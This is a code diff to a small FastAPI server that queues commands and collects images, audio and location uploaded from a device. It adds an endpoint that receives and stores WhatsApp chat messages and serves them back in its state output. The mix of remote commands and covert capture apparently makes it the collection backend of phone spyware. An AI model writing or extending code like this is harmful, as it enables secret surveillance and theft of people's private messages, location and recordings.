@@ -9,6 +9,7 @@ command_queue = []
 latest_image_bytes = None
 latest_audio_bytes = None
 latest_location = "No location yet"
+latest_wa_chats = []
 debug_msg = "No debug info"
 
 def check_key(request: Request):
@@ -38,7 +39,6 @@ async def upload_audio(request: Request, file: UploadFile = File(...)):
     global latest_audio_bytes
     check_key(request)
     latest_audio_bytes = await file.read()
-    print("Audio received!")
     return {"status": "ok"}
 
 @app.post("/location")
@@ -49,13 +49,15 @@ async def post_location(request: Request):
     latest_location = f"Lat: {data.get('lat')}, Lon: {data.get('lon')}"
     return {"status": "ok"}
 
-@app.post("/result")
-async def post_result(request: Request):
-    global debug_msg
+@app.post("/wa")
+async def post_wa(request: Request):
+    global latest_wa_chats
     check_key(request)
     data = await request.json()
-    if "debug_text" in data:
-        debug_msg = data["debug_text"]
+    if "messages" in data:
+        for msg in data["messages"]:
+            latest_wa_chats.insert(0, msg)
+        latest_wa_chats = latest_wa_chats[:50] 
     return {"status": "ok"}
 
 @app.get("/state")
@@ -68,6 +70,7 @@ async def get_state(request: Request):
         "has_image": latest_image_bytes is not None, 
         "has_audio": latest_audio_bytes is not None,
         "location": latest_location,
+        "wa_chats": latest_wa_chats,
         "debug_msg": debug_msg
     }
 
